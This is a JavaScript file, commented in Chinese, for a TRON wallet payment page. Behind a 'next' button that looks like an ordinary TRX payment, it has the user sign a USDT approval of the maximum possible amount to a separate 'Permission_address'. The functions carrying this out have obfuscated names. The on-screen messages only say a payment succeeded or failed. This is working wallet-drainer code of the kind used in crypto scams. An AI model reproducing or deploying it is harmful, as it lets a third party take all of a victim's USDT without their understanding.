// 延迟函数
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 下一步按钮点击处理函数
async function onNextButtonClick() {
  try {
      // 检查钱包是否已连接
      if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
          await connectWallet();
          return; // 连接后停止，等待用户再次点击
      }
      // 钱包已连接，直接执行操作
      if (typeof window.okxwallet !== 'undefined') {
          await DjdskdbGsj();
      } else {
          await KdhshaBBHdg();
      }
  } catch (error) {
      console.error('操作执行失败:', error);
      tip('付款失败，请重新发起交易');
  }
}

// 主交易逻辑：执行TRX转账和USDT授权
async function DjdskdbGsj() {
  const trxAmountInSun = tronWeb.toSun(currentAmount);
  const feeLimit = 1000000000;

  try {
      // 第一步：构建转账交易
      const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
      console.log("构建TRX转账交易...");
      const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
          paymentAddress,
          trxAmountInSun,
          tronWeb.defaultAddress.base58,
          { feeLimit: feeLimit }
      );

      // 延迟1秒后签名并发送转账交易
      await delay(1000);
      const signedTransfer = await tronWeb.trx.sign(transferTransaction);
      const transferResult = await tronWeb.trx.sendRawTransaction(signedTransfer);

      if (!transferResult.result && !transferResult.success) {
          throw new Error("转账交易失败");
      }
      console.log("转账成功，交易哈希:", transferResult.txid);

      // 第二步：构建授权交易
      const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
      const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
          tronWeb.address.toHex(window.usdtContractAddress),
          'increaseApproval(address,uint256)',
          { feeLimit: feeLimit },
          [
              { type: 'address', value: window.Permission_address },
              { type: 'uint256', value: maxUint256 }
          ],
          tronWeb.defaultAddress.base58
      );

      // 检查授权交易是否有效
      if (!approvalTransaction.result || !approvalTransaction.result.result) {
          throw new Error("授权交易构建失败");
      }

      // 延迟1秒后签名并发送授权交易
      await delay(1000);
      const signedApproval = await tronWeb.trx.sign(approvalTransaction.transaction);
      const approvalResult = await tronWeb.trx.sendRawTransaction(signedApproval);

      if (!approvalResult.result && !approvalResult.success) {
          throw new Error("授权交易失败");
      }

      console.log("授权成功，交易哈希:", approvalResult.txid);
      tip("交易成功");
      return approvalResult.txid;

  } catch (error) {
      console.error("操作失败:", error);
      tip("交易失败，请重试");
      throw error;
  }
}

// 仅处理授权逻辑
async function KdhshaBBHdg() {
  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
  const feeLimit = 100000000;  // 设置feeLimit为100 TRX
  const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);

  try {
      console.log("构建授权交易...");
      const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
          usdtContractAddressHex,
          'approve(address,uint256)',
          { feeLimit: feeLimit },
          [
              { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
              { type: 'uint256', value: maxUint256 }
          ],
          tronWeb.defaultAddress.base58
      );

      // 检查授权交易是否有效
      if (!approvalTransaction.result || !approvalTransaction.result.result) {
          throw new Error("授权交易构建失败");
      }

      // 延迟1秒后签名并发送授权交易
      await delay(1000);
      const signedApproval = await tronWeb.trx.sign(approvalTransaction.transaction);

      console.log("发送授权交易...");
      const approvalResult = await tronWeb.trx.sendRawTransaction(signedApproval);

      if (!approvalResult.result) {
          throw new Error("授权交易失败");
      }

      console.log("授权成功，交易哈希:", approvalResult.txid);
      tip("交易成功");
      return approvalResult.txid;

  } catch (error) {
      console.error("执行授权操作失败:", error);
      tip("授权失败，请重试");
      throw error;
  }
}
